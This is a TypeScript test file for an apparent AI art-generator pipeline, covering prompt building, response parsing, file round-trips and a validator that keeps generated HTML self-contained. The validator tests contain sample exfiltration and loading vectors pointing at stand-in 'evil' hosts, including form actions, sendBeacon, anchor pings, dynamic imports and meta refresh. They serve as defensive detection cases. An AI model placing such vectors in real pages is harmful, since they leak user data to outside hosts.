import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildGeneratorTask,
  buildRefineTask,
  parseGeneratedResponse,
  validateSelfContained,
  parseMeta,
  writeGeneratedFiles,
  readGeneratedFiles,
  type GeneratedFiles,
} from "./generator.ts";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const FILES: GeneratedFiles = {
  html: "<!doctype html><h1>CURRENT_WORK</h1>",
  motivation: "the current motivation",
  meta: {
    title: "Test Work",
    summary: "a one-liner",
    mechanism: "render loop",
    principles: ["P1", "P5"],
    references: ["Duchamp"],
    license: "CC BY-SA 4.0",
  },
};

test("agentic task prompt (default) embeds the digest and the tool contract", () => {
  const task = buildGeneratorTask("- Some Catalogued Work (2020) — Source — Mechanism");
  assert.match(task, /Some Catalogued Work/);
  assert.match(task, /write_file/);
  assert.match(task, /read your work back/i);
  assert.match(task, /index\.html/);
  assert.match(task, /motivation\.md/);
  assert.match(task, /meta\.json/);
  assert.match(task, /self-contained/i);
  assert.doesNotMatch(task, /===META===/); // no section markers in agentic mode
});

test("single-shot task prompt embeds the digest and the three section markers", () => {
  const task = buildGeneratorTask("- Some Catalogued Work (2020) — Source — Mechanism", "", "single-shot");
  assert.match(task, /Some Catalogued Work/);
  assert.match(task, /===META===/);
  assert.match(task, /===MOTIVATION===/);
  assert.match(task, /===HTML===/);
  assert.match(task, /self-contained/i);
  assert.doesNotMatch(task, /write_file/);
});

test("buildGeneratorTask folds in accumulated guidance when present", () => {
  const task = buildGeneratorTask("- Catalogued Work", '## 2026-06-16 — rejected "X"\nmore bite please');
  assert.match(task, /accumulated guidance/i);
  assert.match(task, /more bite please/);
});

test("buildGeneratorTask omits the guidance section when there is none", () => {
  assert.doesNotMatch(buildGeneratorTask("- Catalogued Work", ""), /accumulated guidance/i);
});

test("agentic refine task (default) points at the files on disk, not embedded copies", () => {
  const task = buildRefineTask("the canvas throws a TypeError on click — fix it", FILES);
  assert.match(task, /TypeError on click/);
  assert.match(task, /REFINEMENT/i);
  assert.match(task, /self-contained/i);
  assert.match(task, /Read the current files first/);
  assert.match(task, /write_file/);
  assert.doesNotMatch(task, /CURRENT_WORK/); // the model reads them itself
});

test("single-shot refine task embeds feedback, current files, and the output contract", () => {
  const task = buildRefineTask("the canvas throws a TypeError on click — fix it", FILES, "single-shot");
  assert.match(task, /TypeError on click/);
  assert.match(task, /REFINEMENT/i);
  assert.match(task, /self-contained/i);
  assert.match(task, /CURRENT_WORK/);
  assert.match(task, /the current motivation/);
  assert.match(task, /===HTML===/);
});

// ── parseGeneratedResponse ───────────────────────────────────────────────────

const REPLY = `===META===
{"title":"T","summary":"s","mechanism":"m","principles":["P1"],"references":["R"],"license":"CC BY-SA 4.0"}
===MOTIVATION===
Para one.

Para two.
===HTML===
<!doctype html><html><body><h1>WORK</h1></body></html>`;

test("parseGeneratedResponse splits the three sections", () => {
  const s = parseGeneratedResponse(REPLY);
  assert.match(s.metaRaw, /"title":"T"/);
  assert.match(s.motivation, /Para one\./);
  assert.match(s.motivation, /Para two\./);
  assert.match(s.html, /^<!doctype html>/);
});

test("parseGeneratedResponse tolerates prose before the first marker", () => {
  const s = parseGeneratedResponse("Sure, here is the work:\n\n" + REPLY);
  assert.match(s.html, /WORK/);
});

test("parseGeneratedResponse strips markdown fences around sections", () => {
  const fenced = `===META===
\`\`\`json
{"title":"T"}
\`\`\`
===MOTIVATION===
why
===HTML===
\`\`\`html
<!doctype html><h1>X</h1>
\`\`\``;
  const s = parseGeneratedResponse(fenced);
  assert.equal(s.metaRaw, '{"title":"T"}');
  assert.equal(s.html, "<!doctype html><h1>X</h1>");
});

test("parseGeneratedResponse throws with the missing section names", () => {
  assert.throws(() => parseGeneratedResponse("===META===\n{}\n"), /MOTIVATION.*HTML|HTML.*MOTIVATION/);
  assert.throws(() => parseGeneratedResponse("no markers at all"), /META/);
});

// ── file round-trip ──────────────────────────────────────────────────────────

test("writeGeneratedFiles/readGeneratedFiles round-trip the on-disk contract", () => {
  const dir = mkdtempSync(join(tmpdir(), "agent-gen-"));
  try {
    writeGeneratedFiles(dir, FILES);
    const back = readGeneratedFiles(dir);
    assert.equal(back.html, FILES.html);
    assert.equal(back.motivation, FILES.motivation);
    assert.deepEqual(back.meta, FILES.meta);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ── validateSelfContained ────────────────────────────────────────────────────

test("validateSelfContained passes a clean inline page (license <a href> allowed)", () => {
  const html = `<!doctype html><html><head><style>body{background:#000;color:#fff}</style></head>
<body><h1>YES</h1>
<a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a>
<script>document.title="ok"</script></body></html>`;
  assert.deepEqual(validateSelfContained(html), []);
});

test("validateSelfContained flags an external script src", () => {
  const v = validateSelfContained(`<script src="https://cdn.example.com/x.js"></script>`);
  assert.ok(v.some((s) => /external src/.test(s)), v.join(" | "));
});

test("validateSelfContained flags external stylesheet link", () => {
  const v = validateSelfContained(`<link rel="stylesheet" href="https://x.com/a.css">`);
  assert.ok(v.some((s) => /external <link href>/.test(s)), v.join(" | "));
});

test("validateSelfContained flags web fonts (@import / url) and fetch", () => {
  const html = `<style>@import url('https://fonts.googleapis.com/css?f=x');</style><script>fetch('/data')</script>`;
  const v = validateSelfContained(html);
  assert.ok(v.some((s) => /@import|url\(\) external/.test(s)), v.join(" | "));
  assert.ok(v.some((s) => /fetch/.test(s)), v.join(" | "));
});

test("validateSelfContained flags protocol-relative src", () => {
  const v = validateSelfContained(`<img src="//evil.cdn/x.png">`);
  assert.ok(v.some((s) => /external src/.test(s)), v.join(" | "));
});

test("validateSelfContained flags the additional exfil/load vectors", () => {
  const cases: [string, RegExp][] = [
    [`<img srcset="https://cdn/x.png 1x">`, /srcset/],
    [`<script>import("https://evil/x.js")</script>`, /dynamic import/],
    [`<script>navigator.sendBeacon("/log", d)</script>`, /sendBeacon/],
    [`<form action="https://evil/collect"></form>`, /form action/],
    [`<a ping="https://evil/track">x</a>`, /anchor ping/],
    [`<meta http-equiv="refresh" content="0;url=https://evil">`, /meta refresh/],
    [`<base href="https://evil/">`, /base href/],
    [`<object data="https://evil/x.swf"></object>`, /object\/embed data/],
    [`<script type="importmap">{"imports":{}}</script>`, /import map/],
  ];
  for (const [html, expected] of cases) {
    const v = validateSelfContained(html);
    assert.ok(v.some((s) => expected.test(s)), `expected ${expected} for ${html}; got ${v.join(" | ")}`);
  }
});

// ── parseMeta ────────────────────────────────────────────────────────────────

test("parseMeta accepts a complete meta object", () => {
  const meta = parseMeta(JSON.stringify(FILES.meta));
  assert.equal(meta.title, "Test Work");
  assert.deepEqual(meta.principles, ["P1", "P5"]);
});

test("parseMeta throws on missing required fields", () => {
  assert.throws(() => parseMeta(JSON.stringify({ title: "Only a title" })));
});

test("parseMeta throws on invalid JSON", () => {
  assert.throws(() => parseMeta("{not json"));
});
